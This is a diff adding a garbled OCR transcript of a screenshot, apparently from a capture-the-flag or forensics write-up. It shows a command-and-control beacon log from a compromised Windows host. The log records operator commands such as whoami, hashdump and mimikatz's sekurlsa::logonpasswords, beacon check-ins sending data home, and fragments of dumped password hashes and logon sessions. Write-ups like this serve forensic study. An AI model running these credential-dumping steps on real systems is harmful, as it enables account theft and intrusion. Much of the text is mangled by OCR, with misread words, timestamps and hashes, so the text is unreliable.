@@ -1,0 +1,75 @@
+# OCR: 7d43c85ae9e8e5664004649e3ce797a0.jpg
+# 来源: .\02-WriteUp\2024\7d43c85ae9e8e5664004649e3ce797a0.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:33
+
+CEIRCNGOI
+, 心
++ a toe
+e
+P
++ 202
+=
+ity
+D 心
+D atene
+e
+P
+n
+D e
+D
+E
+E
+E
+oe
+0
+[root@locathost 192 168.217.219)# e
+beacon. 113266760_log__beacon_837294754_log
+[rootelocathost 192.168.217-219}# cat * tog
+05/22, 0809-67 UIC (netadata] 192.168.217.219 <- 192.168.217.219; computer: INDEXUSER;
+pid: $836, 05: Windows: version: 6.1; butld: 7601; beacon arch: x64 (x64)
+85/22 08-00-61 UTC [tack] <1829> Tasked beacon to become interactive
+05/22 08:00:15 UTC [input] <nco> sleep 8
+(05/22 08:09:15 UTC [task] <11629> Tasked beacon to become tnteractive
+85/22 68-61-68 UIC [checkin] host called hone, sent: 32 bytes
+05/22 67-48:17 UIC [metadata] 192.168.217.219 <- 192.168.217.219; computer: INDEXUSER;
+pd: 6832; 05: Windows: version: 6.1; butld: 7601; beacon arch: x64 (x64)
+5/22 07:40°14 UTC [task] <11629> Tasked beacon to become interactive
+(85/22 87-40-33 UIC [\nput] <neo> shell whoant
+195/22 67:40:33 UIC [task] <T1689> Tasked beacon to run= whoamt
+05/22 67-48-45 UTC [input] <neo> sleep @
+(05/22 67-40-45 UTC [task] <11629> Tasked beacon to becone interactive
+195/22 67-41-13 UIC [checkin] host called hone, sent: 69 bytes
+05/22 67.41.13 UIC [output]
+received output
+Andexuser administrator
+105/22 7:42:34 UIC [checkin] host called hone, sent: 12 bytes
+85/22 87-43-67 UTC feng <neo> hashdunp,
+95/22 67-43-08 UTC [task] <11083, T1855, T1893> Tasked beacon to dunp hashes
+3
+s2 UIC [checkin] host called hone, sent= 82541 bytes
+05/22 07:43:09 UTC [output]
+Fecetved password hashes:
+余 vr  aad30435D51404eeaad30435b51404ce-32ed8 babs FdcSeScbaGB54737681844:
+Guest S01 aadab43sbs14B4eeaad3o435HS140Aee: fy
+E
+05/22 87-43-15 UIC [input] <neo> Logonpasswords
+sser Administrator *; process:
+user: Admatstrator *; process:
+08/22 87-43-15 UNC [tack] <11083, T18s5, T1802 Tasked beacon to run nintkatz's sekurlsa::logonpasswords command
+(5/22 67:43:15 UTC [checkin] hast called hone, sent: 297504 bytes
+05/22 07:43:16 UTC [output]
+received output
+‘huthenttcation Id = @ ; 996 (69600800:200803¢4)
+Session Service fron
+User Mane 圆 s
+u 5 OHS
+ogen'Server = uty
+Logon Tine 2824/5 /22 15:25:32
+5 1
+n
+e
+vn > INDEXUSERS
+* Donat = NS
+E
+Wechat exe:
